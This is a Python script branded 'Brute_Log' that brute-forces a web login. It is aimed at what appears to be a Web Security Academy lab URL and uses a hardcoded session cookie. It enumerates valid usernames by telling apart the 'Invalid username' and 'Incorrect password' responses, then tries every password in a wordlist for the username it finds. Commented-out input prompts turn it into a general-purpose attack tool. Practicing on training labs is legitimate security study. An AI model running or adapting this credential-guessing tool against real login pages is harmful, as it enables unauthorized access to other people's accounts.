import requests
from termcolor import colored
import sys

# Clear the terminal

print(chr(27) + "[2J")

print("")
print("██████████████████████████████████████████████████████████████████████████████")
print("                                                                              ")
print("██████╗ ██████╗ ██╗   ██╗████████╗███████╗          ██╗      ██████╗  ██████╗ ")
print("██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝          ██║     ██╔═══██╗██╔════╝ ")
print("██████╔╝██████╔╝██║   ██║   ██║   █████╗            ██║     ██║   ██║██║  ███╗")
print("██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝            ██║     ██║   ██║██║   ██║")
print("██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗ ███████╗ ███████╗╚██████╔╝╚██████╔╝")
print("╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝ ╚══════╝ ╚══════╝ ╚═════╝  ╚═════╝ ")
print("                                                                              ") 
print("██████████████████████████████████████████████████████████████████████████████")
print("")              

# Fonction pour effacer la ligne précédente
def clear_line():
    sys.stdout.write("\x1b[1A\x1b[K")  # Effacer la ligne précédente
    sys.stdout.flush()


# Configuration
url = "https://0a9d0076039882c28003e99300000057.web-security-academy.net/login"
cookie_value = "session=zB4HwgkE4UaDadvw0HKM0LKDqlO1bQoP"
password_file = "passlist.txt"
userfile = "userlist.txt"
login_failed_string = "Invalid username"
password_failed_string = "Incorrect password"
    
# url = input('[+] Enter the URL to bruteforce (e.g., https://exemple.net/login): ')
# clear_line()
# cookie_value = input('Enter the cookie value (Optional): ')
# clear_line()
# userfile = input('[+] Enter the path to the username list file (e.g., userlist.txt): ')
# clear_line()
# password_file = input('[+] Enter the path to the password list file (e.g., passlist.txt): ')
# clear_line()
# login_failed_string = input('[+] Enter the string that occurs when login fails: ')
# clear_line()
# password_failed_string = input('[+] Enter the string that occurs when password fails: ')
# clear_line()


# Print a reminder of the configuration
print(colored(('[+] Configuration:'), 'green'))
print(colored(('    URL                    : ' + url), 'yellow'))
print(colored(('    Cookie value           : ' + cookie_value), 'yellow'))
print(colored(('    Userfile               : ' + userfile), 'yellow'))
print(colored(('    Password file          : ' + password_file), 'yellow'))
print(colored(('    Login failed string    : ' + login_failed_string), 'yellow'))
print(colored(('    Password failed string : ' + password_failed_string), 'yellow'))
print("")
print(colored(('Starting brute force attack...'), 'green'))



bool_login_true = False

def make_request(data):
    if cookie_value:
        cookies = {'Cookie': cookie_value}
        return requests.post(url, data=data, cookies=cookies)
    else:
        return requests.post(url, data=data)
    


def cracking(username, password):
    global bool_login_true 
    data = {'username': username, 'password': password, 'Login': 'submit'}
    response = make_request(data)
    response_text = response.content.decode()
    
    if login_failed_string in response_text and bool_login_true == False:
        return False
    if password_failed_string in response_text and bool_login_true == False:
        bool_login_true = True
        return True
    if password_failed_string in response_text and bool_login_true == True:
        return False
    else:
        clear_line()
        clear_line()
        print(colored(('[+] Found Username: ==> ' + username), 'green'))
        print(colored(('[+] Found Password: ==> ' + password), 'green'))
        print("")
        return True
    return False

def brute_force_passwords(username):
    global bool_login_true
    print(colored(('Brute forcing password for user: ' + username), 'yellow'))
    with open(password_file, 'r') as pass_file:
        passwords = pass_file.readlines()

    for password in passwords:
        password = password.strip()
        clear_line()
        print(colored(('Trying password: ' + password), 'yellow'))
        if cracking(username, password):
            return True
    return False

def brute_force_usernames():
    global bool_login_true
    with open(userfile, 'r') as userlist:
        usernames = userlist.readlines()
    
    for username in usernames:
        username = username.strip()
        clear_line()
        print(colored(('Trying username: ' + username), 'yellow'))
        if cracking(username, "test"):
            clear_line()
            print(colored(('Username found: ' + username), 'green'))
            if brute_force_passwords(username):
                return
    print('[!!] Password Not In List')


brute_force_usernames()
